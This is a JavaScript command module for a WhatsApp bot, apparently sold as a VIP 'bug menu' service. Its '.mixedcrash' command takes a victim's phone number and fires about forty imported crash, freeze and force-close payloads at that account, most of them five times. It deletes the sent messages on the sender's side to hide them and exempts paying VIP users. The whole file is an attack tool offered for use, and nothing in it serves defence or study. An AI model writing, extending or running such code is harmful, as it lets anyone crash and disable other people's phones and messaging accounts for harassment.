import { VIPQueries } from "../../database/query.js"
import { VIPHelper } from "../../whatsapp/index.js"

export default {
  name: "mixedcrash",
  commands: ["mixedcrash", "mixed"],
  category: "bugmenu",
  description: "Send ALL bugs (except group bugs)",
  usage: ".mixedcrash <phone number>",
  adminOnly: false,
  
  async execute(sock, sessionId, args, m) {
    try {
      const userTelegramId = VIPHelper.fromSessionId(sessionId)
      if (!userTelegramId) {
        await sock.sendMessage(m.chat, { text: "❌ Session error\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙" }, { quoted: m })
        return
      }

      const vipStatus = await VIPQueries.isVIP(userTelegramId)
      if (!vipStatus.isVIP) {
        await sock.sendMessage(m.chat, { text: "❌ VIP access required\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙" }, { quoted: m })
        return
      }

      if (!args || args.length === 0) {
        await sock.sendMessage(m.chat, { 
          text: "❌ Usage: .mixedcrash <phone number>\nExample: .mixedcrash 234 806 7023422\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙"
        }, { quoted: m })
        return
      }

      let phoneNumber = args.join('').replace(/[^0-9]/g, '')
      
      if (!phoneNumber) {
        await sock.sendMessage(m.chat, { text: "❌ Invalid phone number\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙" }, { quoted: m })
        return
      }

      const target = `${phoneNumber}@s.whatsapp.net`
      
      if (target === m.sender) {
        await sock.sendMessage(m.chat, { text: "❌ Cannot attack yourself\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙" }, { quoted: m })
        return
      }

      // Check if target is a VIP user by looking up their phone number in the database
      const targetUser = await VIPQueries.getUserByPhone(phoneNumber)
      if (targetUser && targetUser.telegram_id) {
        const targetVipStatus = await VIPQueries.isVIP(targetUser.telegram_id)
        if (targetVipStatus.isVIP) {
          await sock.sendMessage(m.chat, { text: "❌ Cannot attack VIP users\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙" }, { quoted: m })
          return
        }
      }
      const { 
  delaycrash, delayBlonde, DefJam, HardInvis, XProtexDelayCrash,
  BlankVisco, bulldoserV3, PhotoDelay, protocolbug6, VerloadXDelayBlank,
  VerloadHardCore, noise, crashinvis, newImage2,
  iosinVisFC, NewProtocolbug6, VtxForceDelMsg2, SnitchDelayVolteX,
  freezeIphone, IosInvisible, ContactXIos, VampireCrashiPhone, crashios,
  crashios3, FlowXNull, forceClick, XheavensdeeP, SqhForce, FreezePackk,
  SqhForceCombo, paymentDelay, CVisible, location, delaytod, AmeliaBeta,
  bulldozer1GB2, VzxtusHardTime, MewVtxpayment, StickerPackFreeze, LocationDelay
} = await import("../../lib/buggers/bug.js")

      let progressMsg = await sock.sendMessage(m.chat, { 
        text: `🌪️ *MIXED ATTACK - ALL BUGS*\n\n🎯 Target: +${phoneNumber}\n💣 Initializing...\n⚠️ This will take several minutes...

` + `\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`
      }, { quoted: m })

      let progress = `🌪️ *MIXED ATTACK*\n\n🎯 Target: +${phoneNumber}\n\n📊 *Progress:*\n\n`

      // FIXED: Consistent parameter order (sock, target) for all bugs
      const bugs = [
        // Android + Crash
        { name: 'StickerPackFreeze', fn: () => StickerPackFreeze(sock, target), count: 5 },
        { name: 'Delaycrash', fn: () => delaycrash(sock, target, true), count: 5 },
        { name: 'DelayBlonde', fn: () => delayBlonde(sock, target, { jid: target }), count: 5 },
        { name: 'DefJam', fn: () => DefJam(sock, target), count: 5 },
        { name: 'HardInvis', fn: () => HardInvis(sock, target), count: 1 },
        { name: 'XProtexDelay', fn: () => XProtexDelayCrash(sock, target, true), count: 5 },
        { name: 'BlankVisco', fn: () => BlankVisco(sock, target), count: 5 },
        { name: 'BulldoserV3', fn: () => bulldoserV3(sock, phoneNumber), count: 5 },
        { name: 'PhotoDelay', fn: () => PhotoDelay(sock, target), count: 5 },
        { name: 'Protocol6', fn: () => protocolbug6(sock, target, true), count: 5 },
        { name: 'VerloadDelay', fn: () => VerloadXDelayBlank(sock, target, true), count: 5 },
        { name: 'VerloadHard', fn: () => VerloadHardCore(sock, target), count: 5 },
        { name: 'Noise', fn: () => noise(sock, target), count: 5 },
        { name: 'CrashInvis', fn: () => crashinvis(sock, target), count: 5 }, // FIXED: was crashinvis(target, sock)
        { name: 'NewImage2', fn: () => newImage2(sock, target), count: 5 },
        { name: 'LocationDelay', fn: () => LocationDelay(sock, target), count: 5 },
        // iOS + ForceClose
        { name: 'IosinVisFC', fn: () => iosinVisFC(sock, target), count: 5 },
        { name: 'NewProtocol6', fn: () => NewProtocolbug6(sock, target), count: 5 },
        { name: 'VtxForceDel', fn: () => VtxForceDelMsg2(sock, target), count: 5 },
        { name: 'SnitchDelay', fn: () => SnitchDelayVolteX(sock, target), count: 5 },
        { name: 'FreezeIphone', fn: () => freezeIphone(sock, target), count: 5 },
        { name: 'IosInvisible', fn: () => IosInvisible(sock, target), count: 5 },
        { name: 'ContactXIos', fn: () => ContactXIos(sock, target), count: 5 },
        { name: 'VampireCrash', fn: () => VampireCrashiPhone(sock, target), count: 5 },
        { name: 'CrashIos', fn: () => crashios(sock, target), count: 5 },
        { name: 'CrashIos3', fn: () => crashios3(sock, target), count: 5 },
        { name: 'FlowXNull', fn: () => FlowXNull(sock, target), count: 5 },
        { name: 'ForceClick', fn: () => forceClick(sock, target), count: 5 },
        { name: 'XheavensdeeP', fn: () => XheavensdeeP(sock, target), count: 5 },
        { name: 'SqhForce', fn: () => SqhForce(sock, target), count: 5 },
        { name: 'FreezePack', fn: () => FreezePackk(sock, target), count: 5 },
        { name: 'SqhCombo', fn: () => SqhForceCombo(sock, target), count: 1 },
        // Others
        { name: 'PaymentDelay', fn: () => paymentDelay(sock, target), count: 5 },
        { name: 'CVisible', fn: () => CVisible(sock, target), count: 5 },
        { name: 'Location', fn: () => location(sock, target), count: 5 },
        { name: 'DelayTod', fn: () => delaytod(sock, target), count: 5 },
        { name: 'AmeliaBeta', fn: () => AmeliaBeta(sock, target), count: 5 },
        { name: 'Bulldozer1GB', fn: () => bulldozer1GB2(sock, phoneNumber), count: 5 }, // FIXED: function name
        { name: 'VzxtusHard', fn: () => VzxtusHardTime(sock, target), count: 5 },
        { name: 'MewVtx', fn: () => MewVtxpayment(sock, target), count: 5 }
      ]

      let totalWaves = 0

      for (const bug of bugs) {
        progress += `🔄 ${bug.name}: `
        for (let i = 0; i < bug.count; i++) {
          const sentMsg = await bug.fn()
          
          // Delete for myself only
          if (sentMsg && sentMsg.key) {
            try {
              await sock.chatModify(
                { 
                  clear: { 
                    messages: [{ id: sentMsg.key.id, fromMe: true }] 
                  } 
                }, 
                target
              )
            } catch (error) {
              // Silent fail
            }
          }
          
          progress += `✓ `
          totalWaves++
          await new Promise(resolve => setTimeout(resolve, 500))
        }
        progress += `(${bug.count}/${bug.count})\n`
        
        await sock.sendMessage(m.chat, { 
          text: progress,
          edit: progressMsg.key
        })
      }

      progress += `\n✅ Successfully sent bug to +${phoneNumber}\n📦 Total: ${totalWaves} waves`

      await sock.sendMessage(m.chat, { 
        text: progress,
        edit: progressMsg.key
      })

      return { success: true }
    } catch (error) {
      console.error("[MixedCrash] Error:", error)
      await sock.sendMessage(m.chat, { text: "❌ Attack failed: \n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙" + error.message }, { quoted: m })
      return { success: false }
    }
  }
}